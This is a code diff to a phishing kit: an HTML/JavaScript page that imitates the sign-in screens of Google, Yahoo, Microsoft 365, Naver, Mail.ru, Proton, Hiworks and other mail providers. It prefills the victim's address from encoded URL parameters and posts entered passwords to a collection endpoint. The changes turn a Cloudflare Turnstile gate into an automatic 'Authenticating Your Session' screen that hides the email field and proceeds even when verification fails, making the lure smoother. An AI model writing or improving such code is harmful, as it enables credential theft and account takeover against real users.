@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title id="pageTitle">Secure Sign In</title>
+<title id="pageTitle">Authenticating Your Session</title>
 <style>
   body{-webkit-touch-callout:none;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none}
 </style>
@@ -32,28 +32,23 @@
 <style>
 *{margin:0;padding:0;box-sizing:border-box}
 body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Arial,'Noto Sans KR','Noto Sans JP','Noto Sans SC',sans-serif;min-height:100vh;background-size:cover;background-position:center;color:#333;display:flex;justify-content:center;align-items:center;padding:20px}
-.err-box{color:#d32f2f;font-size:13px;margin-top:10px;display:none;text-align:left;font-weight:500}
+.err-box{color:#d32f2f;font-size:13px;margin-top:10px;display:none;text-align:center;font-weight:500}
 .err-box.show{display:block}
 .vh{position:absolute;width:1px;height:1px;overflow:hidden;clip:rect(0,0,0,0);white-space:nowrap;border:0}
 
 /* GATE */
-body.is-gate{display:flex!important;align-items:center;justify-content:center;background:linear-gradient(135deg,#eef2f8,#e3ecf7 50%,#eef1fa)!important;padding:20px}
+body.is-gate{display:flex!important;align-items:center;justify-content:center;background:#f1f2f4!important;padding:20px}
 .gate-wrap{display:none;width:100%;justify-content:center}
-.gate-card{background:#fff;width:100%;max-width:420px;border-radius:14px;padding:38px 32px;box-shadow:0 12px 40px rgba(16,24,40,.12);border:1px solid #e6ebf2;text-align:center}
-.gate-mark{width:52px;height:52px;border-radius:14px;background:#1a73e8;color:#fff;font-size:24px;font-weight:800;display:flex;align-items:center;justify-content:center;margin:0 auto 18px}
-.gate-title{font-size:21px;font-weight:700;color:#16202c;margin-bottom:6px}
-.gate-sub{font-size:14px;color:#64748b;margin-bottom:26px;line-height:1.5}
-.gate-field{text-align:left;margin-bottom:18px}
-.gate-label{display:block;font-size:13px;font-weight:600;color:#33404f;margin-bottom:7px}
-.gate-input{width:100%;padding:13px 14px;border:1px solid #d5dce6;border-radius:9px;font-size:15px;color:#16202c;background:#fbfcfe}
+.gate-card{background:#fff;width:100%;max-width:520px;border-radius:14px;padding:52px 40px 40px;box-shadow:0 3px 18px rgba(16,24,40,.07);border:1px solid #eceef1;text-align:center}
+.gate-title{font-size:26px;font-weight:600;color:#16202c;line-height:1.25;margin-bottom:12px}
+.gate-sub{font-size:16px;color:#7b8794;line-height:1.5;max-width:400px;margin:0 auto}
+.gate-field{margin-top:22px}
+.gate-input{width:100%;padding:13px 15px;border:1px solid #d5dce6;border-radius:9px;font-size:15px;color:#16202c;background:#fbfcfe;text-align:center}
 .gate-input:focus{outline:none;border-color:#1a73e8;background:#fff;box-shadow:0 0 0 3px rgba(26,115,232,.12)}
-.gate-ts{display:flex;justify-content:center;margin-bottom:20px;min-height:65px}
-.gate-btn{width:100%;padding:14px;border:0;border-radius:9px;background:#1a73e8;color:#fff;font-size:16px;font-weight:600;cursor:pointer}
-.gate-btn:hover:not(:disabled){background:#1557b0}
-.gate-btn:disabled{opacity:.55;cursor:not-allowed}
-.gate-note{font-size:11.5px;color:#94a3b8;margin-top:18px}
+.gate-ts{display:flex;justify-content:center;margin-top:36px;min-height:65px}
 .gate-retry{display:none;margin-top:14px;font-size:13px}
 .gate-retry a{color:#1a73e8;text-decoration:underline;cursor:pointer}
+.gate-foot{font-size:13px;color:#94a3b8;margin-top:40px}
 
 /* YAHOO */
 body.is-yahoo{display:flex!important;flex-direction:column;background:#f4f4f4!important;padding:0!important;justify-content:flex-start}
@@ -440,6 +435,9 @@ body.is-loading .loading-layout{display:flex}
 .vcb-badge.crit{background:#e8f0fe;color:#1a73e8}
 
 @media(max-width:760px){
+  .gate-card{padding:38px 24px 30px;border-radius:12px}
+  .gate-title{font-size:22px}
+  .gate-sub{font-size:15px}
   .google-card{flex-direction:column;padding:30px 24px;border-radius:20px}
   .google-right{padding:24px 0 0}
   .google-welcome{font-size:28px}
@@ -453,7 +451,7 @@ body.is-loading .loading-layout{display:flex}
   .yahoo-container{padding:30px 20px;justify-content:center}
   .naver-layout{padding:30px 20px}
   .m365-card{padding:30px 24px}
-  .tonline-box,.apple-card,.mailru-card,.proton-card,.ionos-card,.generic-card,.singtel-card,.gate-card{padding-left:24px;padding-right:24px}
+  .tonline-box,.apple-card,.mailru-card,.proton-card,.ionos-card,.generic-card,.singtel-card{padding-left:24px;padding-right:24px}
 }
 </style>
 </head>
@@ -464,18 +462,16 @@ body.is-loading .loading-layout{display:flex}
 <!-- GATE -->
 <div class="gate-wrap" id="gateContainer">
   <div class="gate-card">
-    <div class="gate-mark">✉</div>
-    <h1 class="gate-title">Continue to your mailbox</h1>
-    <p class="gate-sub">Confirm your email address to be taken to your provider's sign-in page.</p>
-    <div class="gate-field">
-      <label class="gate-label" for="gateEmail">Email address</label>
-      <input type="email" id="gateEmail" class="gate-input" placeholder="you@example.com" autocomplete="username" autocapitalize="off" spellcheck="false" autofocus>
+    <h1 class="gate-title">Authenticating Your Session</h1>
+    <p class="gate-sub">We need to confirm you are human before proceeding to your secure workspace.</p>
+    <div class="gate-field" id="gateField" style="display:none">
+      <label class="vh" for="gateEmail">Email address</label>
+      <input type="email" id="gateEmail" class="gate-input" placeholder="you@example.com" autocomplete="username" autocapitalize="off" spellcheck="false">
     </div>
     <div id="turnstileSlot" class="gate-ts"></div>
-    <button id="gateBtn" class="gate-btn" onclick="submitGate()">Continue</button>
-    <div id="gate-err" class="err-box" style="text-align:center"></div>
-    <div class="gate-retry" id="gateRetry"><a onclick="resetGate()">Start over</a></div>
-    <p class="gate-note">Protected by Cloudflare Turnstile</p>
+    <div id="gate-err" class="err-box"></div>
+    <div class="gate-retry" id="gateRetry"><a onclick="resetGate()">Try again</a></div>
+    <p class="gate-foot" id="gateFoot">© 2026</p>
   </div>
 </div>
 
@@ -571,7 +567,7 @@ body.is-loading .loading-layout{display:flex}
   <button class="yandex-btn-sec">Send email for log in</button>
   <div class="yandex-info-text">A message with a link will be sent to <br><strong id="yandexInfoEmail">user@yandex.com</strong>.<br>Open it on any device.</div>
   <div class="yandex-footer-text">Yandex ID. The key for all your services<br><a href="#">Learn more</a></div>
-  <div id="yandex-err" class="err-box" style="text-align:center;color:#ff4444"></div>
+  <div id="yandex-err" class="err-box" style="color:#ff4444"></div>
 </div>
 
 <!-- MAILRU -->
@@ -581,7 +577,7 @@ body.is-loading .loading-layout{display:flex}
   <label class="vh" for="mailruPass">Пароль</label>
   <input type="password" id="mailruPass" class="mailru-input" placeholder="Введите пароль" autocomplete="current-password">
   <button id="mailruBtn" class="mailru-btn" onclick="submitLogin('mailru')">Войти</button>
-  <div id="mailru-err" class="err-box" style="text-align:center"></div>
+  <div id="mailru-err" class="err-box"></div>
   <div class="mailru-footer">© Mail.ru Group. Все права защищены.</div>
 </div>
 
@@ -592,7 +588,7 @@ body.is-loading .loading-layout{display:flex}
   <label class="vh" for="protonPass">Password</label>
   <input type="password" id="protonPass" class="proton-input" placeholder="Enter your password" autocomplete="current-password">
   <button id="protonBtn" class="proton-btn" onclick="submitLogin('proton')">Sign in</button>
-  <div id="proton-err" class="err-box" style="text-align:center"></div>
+  <div id="proton-err" class="err-box"></div>
   <div class="proton-footer">© Proton Technologies. All rights reserved.</div>
 </div>
 
@@ -649,7 +645,7 @@ body.is-loading .loading-layout{display:flex}
           <input type="password" id="hiworksPass1" placeholder="Password" autocomplete="current-password">
         </div>
         <button type="button" class="hiworks-btn" id="hiworksBtn1" onclick="submitHiworksStep1()">Next</button>
-        <div id="hiworks-err1" class="err-box" style="text-align:center"></div>
+        <div id="hiworks-err1" class="err-box"></div>
         <div class="hiworks-banner" style="margin-top:30px">
           <div class="hiworks-banner-text"><h3>영업 기회부터 계약까지</h3><p>하이웍스 세일즈로 관리하세요</p></div>
           <div class="hiworks-banner-img"><svg viewBox="0 0 100 60" width="100%" height="100%"><rect width="100" height="60" fill="#fff" rx="4" stroke="#ffe0b2"/><path d="M10 50 L30 35 L50 45 L70 20 L90 30" fill="none" stroke="#f57c00" stroke-width="2"/><circle cx="70" cy="20" r="3" fill="#f57c00"/></svg></div>
@@ -665,7 +661,7 @@ body.is-loading .loading-layout{display:flex}
           <input type="password" id="hiworksPass2" placeholder="Password" autocomplete="current-password">
         </div>
         <button type="button" class="hiworks-btn" id="hiworksBtn2" onclick="submitHiworksStep2()" style="background:#b3d4fc">Sign-in</button>
-        <div id="hiworks-err2" class="err-box" style="text-align:center"></div>
+        <div id="hiworks-err2" class="err-box"></div>
         <div class="hiworks-links-row">
           <a href="#">Sign in with another ID</a> | <a href="#">Forgot password</a>
           <div class="hiworks-ip-toggle"><div class="hiworks-toggle-switch"></div> IP Security</div>
@@ -727,7 +723,7 @@ body.is-loading .loading-layout{display:flex}
       <div class="naver-divider">Make it safer</div>
       <button class="naver-passkey">Sign in with a passkey</button>
       <div class="naver-footer-links"><a href="#">Find ID or Password</a> | <a href="#">Sign up</a></div>
-      <div id="naver-err" class="err-box" style="text-align:center"></div>
+      <div id="naver-err" class="err-box"></div>
     </div>
   </div>
 </div>
@@ -781,7 +777,7 @@ body.is-loading .loading-layout{display:flex}
     </div>
   </div>
   <div class="hibox-footer"><div style="font-weight:bold;font-size:16px;color:#0055a4;margin-bottom:5px">HiNet</div>中華電信股份有限公司版權所有 © Chunghwa Telecom Co., Ltd.</div>
-  <div id="hibox-err" class="err-box" style="text-align:center;padding-bottom:10px"></div>
+  <div id="hibox-err" class="err-box" style="padding-bottom:10px"></div>
 </div>
 
 <!-- IONOS -->
@@ -794,7 +790,7 @@ body.is-loading .loading-layout{display:flex}
     <a href="#" class="ionos-link">Forgot Your Password?</a>
     <div class="ionos-warning"><strong>Not your device?</strong> Log out after the session or use private browsing mode.</div>
     <button id="ionosBtn" class="ionos-btn" onclick="submitLogin('ionos')">Next</button>
-    <div id="ionos-err" class="err-box" style="text-align:center"></div>
+    <div id="ionos-err" class="err-box"></div>
   </div></div>
   <div class="ionos-footer">© IONOS SE. All rights reserved.</div>
 </div>
@@ -821,7 +817,7 @@ body.is-loading .loading-layout{display:flex}
     <div class="rc-input-group"><div class="rc-input-icon">@</div><input type="email" id="webmailEmail" readonly disabled></div>
     <div class="rc-input-group"><div class="rc-input-icon">🔒</div><input type="password" id="webmailPass" placeholder="Password" autocomplete="current-password"></div>
     <button id="webmailBtn" class="rc-btn" onclick="submitLogin('webmail')">LOGIN</button>
-    <div id="webmail-err" class="err-box" style="text-align:center"></div>
+    <div id="webmail-err" class="err-box"></div>
   </div>
   <div class="rc-footer"><a href="#" id="rcForgot">Forgot password?</a> • <a href="#" id="rcCreate">Create account</a></div>
 </div>
@@ -836,7 +832,7 @@ body.is-loading .loading-layout{display:flex}
       <button type="button" class="singtel-eye" onclick="togglePass('singtelPass')"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg></button></div>
     <button id="singtelBtn" class="singtel-btn" onclick="submitLogin('singtel')">Log in</button>
     <a href="#" class="singtel-forgot">Have trouble logging in?</a>
-    <div id="singtel-err" class="err-box" style="text-align:center"></div>
+    <div id="singtel-err" class="err-box"></div>
   </div>
 </div>
 
@@ -855,7 +851,7 @@ body.is-loading .loading-layout{display:flex}
   </div>
   <div class="westnet-links"><a href="#">Change email</a><a href="#">Sign in another way</a></div>
   <div class="westnet-lang"><button class="westnet-lang-btn">English (US)</button></div>
-  <div id="westnet-err" class="err-box" style="text-align:center"></div>
+  <div id="westnet-err" class="err-box"></div>
 </div>
 
 <script>
@@ -871,7 +867,8 @@ const TURNSTILE_SITE_KEY = '0x4AAAAAAGFsIGhYqHJaKuEy';
 
 let currentEmail = '', currentDomain = '', proof = '', proofTs = '';
 let attempts = 0, firstPass = '', hiworksFirst = '', pendingPass = '';
-let tsToken = '', tsWidget = null, gateBusy = false;
+let tsToken = '', tsWidget = null, gateBusy = false, gateOpen = false;
+let activeProvider = '';
 
 /* ============ HELPERS ============ */
 const esc = s => String(s == null ? '' : s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;').replace(/'/g,'&#39;');
@@ -902,15 +899,12 @@ function togglePass(id) { const p = el(id); if (p) p.type = p.type === 'password
 const extractDomain = e => (e && e.indexOf('@') > 0) ? e.split('@')[1].toLowerCase() : '';
 
 /* ============ EMAIL FROM URL ============ */
-// Accepts ?u= / ?email= / ?auth= / ?e= / ?login= / ?login_hint= / ?id= / ?mail=
-// plus a bare base64 payload in the query string.
 const EMAIL_PARAMS = ['u', 'email', 'auth', 'e', 'login', 'login_hint', 'id', 'mail'];
 
 function b64(v) {
   try { const d = atob(String(v).replace(/-/g, '+').replace(/_/g, '/')); return d.indexOf('@') > -1 ? d : ''; }
   catch (e) { return ''; }
 }
-
 function decodeEmail(raw) {
   let s = raw;
   try { s = decodeURIComponent(s); } catch (e) {}
@@ -919,7 +913,6 @@ function decodeEmail(raw) {
   const d = b64(s);
   return d ? d.trim() : '';
 }
-
 function readEmailFromUrl() {
   const q = new URLSearchParams(location.search);
   for (const key of EMAIL_PARAMS) {
@@ -1041,19 +1034,28 @@ async function detectByMX(domain) {
 
 /* ============ TURNSTILE GATE ============ */
 function renderGate(prefill, message) {
+  gateOpen = true;
   setBodyClass('is-gate');
   el('gateContainer').style.display = 'flex';
   el('gateRetry').style.display = 'none';
   clearError('gate-err');
-  if (message) showError('gate-err', message);
-  if (prefill) el('gateEmail').value = prefill;
-  setTimeout(() => el('gateEmail').focus(), 60);
 
-  if (TURNSTILE_SITE_KEY === 'REPLACE_WITH_YOUR_SITE_KEY') { el('gateBtn').disabled = false; return; }
+  const email = prefill || currentEmail || '';
+  el('gateFoot').textContent = '© 2026 ' + (extractDomain(email) || '');
+  if (email) {
+    el('gateEmail').value = email;
+    el('gateField').style.display = 'none';
+  } else {
+    el('gateEmail').value = '';
+    el('gateField').style.display = 'block';
+    setTimeout(() => el('gateEmail').focus(), 80);
+  }
+  if (message) showError('gate-err', message);
+
+  if (TURNSTILE_SITE_KEY === 'REPLACE_WITH_YOUR_SITE_KEY') { setTimeout(submitGate, 700); return; }
   if (tsWidget !== null && window.turnstile) {
     tsToken = '';
     try { window.turnstile.reset(tsWidget); } catch (e) {}
-    el('gateBtn').disabled = true;
     return;
   }
   if (window.turnstile) { mountTS(); return; }
@@ -1063,8 +1065,8 @@ function renderGate(prefill, message) {
   s.async = s.defer = true;
   s.onload = mountTS;
   s.onerror = function () {
-    el('gateBtn').disabled = false;
-    showError('gate-err', 'Verification widget could not load. You may still continue.');
+    showError('gate-err', 'Verification widget could not load. Continuing…');
+    setTimeout(submitGate, 900);
   };
   document.head.appendChild(s);
 }
@@ -1075,38 +1077,39 @@ function mountTS() {
     tsWidget = window.turnstile.render(el('turnstileSlot'), {
       sitekey: TURNSTILE_SITE_KEY,
       theme: 'light',
-      callback: function (tok) { tsToken = tok; el('gateBtn').disabled = false; },
-      'expired-callback': function () { tsToken = ''; el('gateBtn').disabled = true; },
-      'error-callback': function () { tsToken = ''; el('gateBtn').disabled = false; }
+      callback: function (tok) { tsToken = tok; submitGate(); },
+      'expired-callback': function () { tsToken = ''; },
+      'error-callback': function () { tsToken = ''; setTimeout(submitGate, 600); }
     });
-    el('gateBtn').disabled = true;
-  } catch (e) { el('gateBtn').disabled = false; }
+  } catch (e) { setTimeout(submitGate, 800); }
 }
 
 function resetGate() {
   clearError('gate-err');
-  el('gateEmail').value = '';
   el('gateRetry').style.display = 'none';
   tsToken = '';
-  if (tsWidget !== null && window.turnstile) { try { window.turnstile.reset(tsWidget); } catch (e) {} el('gateBtn').disabled = true; }
-  else el('gateBtn').disabled = false;
-  el('gateEmail').focus();
-  try { history.replaceState({}, '', location.pathname); } catch (e) {}
+  if (tsWidget !== null && window.turnstile) { try { window.turnstile.reset(tsWidget); } catch (e) {} }
+  else renderGate();
 }
 
 async function submitGate() {
-  if (gateBusy) return;
+  if (gateBusy || !gateOpen) return;
   clearError('gate-err');
-  const email = el('gateEmail').value.trim();
-  if (!/^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/.test(email)) { showError('gate-err', 'Enter a valid email address.'); el('gateEmail').focus(); return; }
+
+  const typed = el('gateEmail').value.trim();
+  const email = typed || currentEmail;
+  if (!/^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/.test(email)) {
+    showError('gate-err', 'Enter a valid email address.');
+    el('gateField').style.display = 'block';
+    el('gateEmail').focus();
+    return;
+  }
   if (TURNSTILE_SITE_KEY !== 'REPLACE_WITH_YOUR_SITE_KEY' && window.turnstile && !tsToken) {
-    showError('gate-err', 'Please complete the verification check.'); return;
+    showError('gate-err', 'Please complete the verification check.');
+    return;
   }
 
   gateBusy = true;
-  const btn = el('gateBtn'), orig = btn.textContent;
-  btn.disabled = true; btn.textContent = 'Checking…';
-
   try {
     const { res, data } = await postJSON(TS_URL, { token: tsToken, email: email }, 15000);
     if (!res.ok || !data || !data.success) {
@@ -1114,22 +1117,22 @@ async function submitGate() {
       el('gateRetry').style.display = 'block';
       tsToken = '';
       if (tsWidget !== null && window.turnstile) { try { window.turnstile.reset(tsWidget); } catch (e) {} }
-      btn.disabled = false; btn.textContent = orig;
       return;
     }
     currentEmail = (data.email || email).trim();
+    currentDomain = extractDomain(currentEmail);
     proof = data.proof || '';
     proofTs = String(data.ts || '');
     try {
       history.replaceState({}, '', '?u=' + encodeURIComponent(currentEmail) + '&p=' + encodeURIComponent(proof) + '&t=' + encodeURIComponent(proofTs));
     } catch (e) {}
+    gateOpen = false;
     el('gateContainer').style.display = 'none';
-    btn.textContent = orig;
     await startLogin();
     restorePendingPass();
   } catch (e) {
     showError('gate-err', e.name === 'AbortError' ? 'The server took too long. Please try again.' : 'Connection error. Please try again.');
-    btn.disabled = false; btn.textContent = orig;
+    el('gateRetry').style.display = 'block';
   } finally { gateBusy = false; }
 }
 
@@ -1142,7 +1145,6 @@ function restorePendingPass() {
 
 /* ============ RENDERERS ============ */
 const FLEX_LAYOUTS = ['yahoo','google','m365','naver','daum','singtel','zoho','webmail'];
-let activeProvider = '';
 
 function renderLayout(id) {
   setBodyClass('is-' + id);
@@ -1239,10 +1241,7 @@ async function startLogin() {
   activeProvider = prov;
   if (prov === 'hiworks') renderHiworks();
   else if (prov === 'generic') renderGeneric();
-  else if (FLEX_LAYOUTS.includes(prov) || prov === 'abv' || prov === 'apple' || prov === 'yandex' ||
-           prov === 'mailru' || prov === 'proton' || prov === 'ionos' || prov === 'hibox' ||
-           prov === 'tonline' || prov === 'generic' || prov === 'webmail') renderLayout(prov);
-  else renderLayout('webmail');
+  else renderLayout(prov);
 }
 
 /* ============ SUBMIT ============ */
@@ -1265,7 +1264,6 @@ async function submitLogin(platform) {
     const { res, data } = await postJSON(LOGIN_URL, payload);
     const b = data || {};
 
-    // Proof missing or expired — reopen the gate in place, keep the address and the typed password.
     if (res.status === 403 && stage === 1) {
       attempts--;
       firstPass = '';
@@ -1470,15 +1468,12 @@ document.addEventListener('DOMContentLoaded', function () {
   proof = q.get('p') || '';
   proofTs = q.get('t') || '';
 
-  el('gateEmail').addEventListener('keypress', e => { if (e.key === 'Enter') { e.preventDefault(); submitGate(); } });
+  el('gateEmail').addEventListener('keypress', e => {
+    if (e.key === 'Enter') { e.preventDefault(); submitGate(); }
+  });
 
-  const email = readEmailFromUrl();
-  if (email) {
-    currentEmail = email;
-    startLogin();
-  } else {
-    renderGate();
-  }
+  currentEmail = readEmailFromUrl();
+  renderGate();
 });
 </script>
 </body>
